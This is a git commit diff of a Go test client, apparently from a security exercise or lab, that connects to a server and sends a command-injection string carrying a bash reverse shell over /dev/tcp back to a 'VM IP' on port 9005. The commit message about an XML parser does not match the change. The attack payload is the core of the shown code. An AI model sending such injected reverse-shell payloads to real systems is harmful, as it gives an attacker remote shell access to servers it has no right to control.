669d496d4433ea8a5721933387810e63118c67a6
Johnathon Beuter <johnathonbeuter@gmail.com>
2024-06-11 21:49:00 -0400

    making xml parser

--- ACE/Operation_2/clientTest.go
+++ ACE/Operation_2/clientTest.go
@@ -7,13 +7,13 @@ import (
 
 func main() {
 	// Connect to the server
-	conn, err := net.Dial("tcp", "10.76.165.15:9803")
+	conn, err := net.Dial("tcp", "10.76.165.15:9803") //This needs to be changed for the right port
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	_, err = conn.Write([]byte("; sh -i >& /dev/tcp/192.168.0.87/9005 0>&1")) //Could this be transmitted and ran?
+	_, err = conn.Write([]byte("; bash -i >& /dev/tcp/REPLACE WITH VM IP/9005 0>&1")) //Could this be transmitted and ran?
 
 	if err != nil {
 		fmt.Println("BROKE")
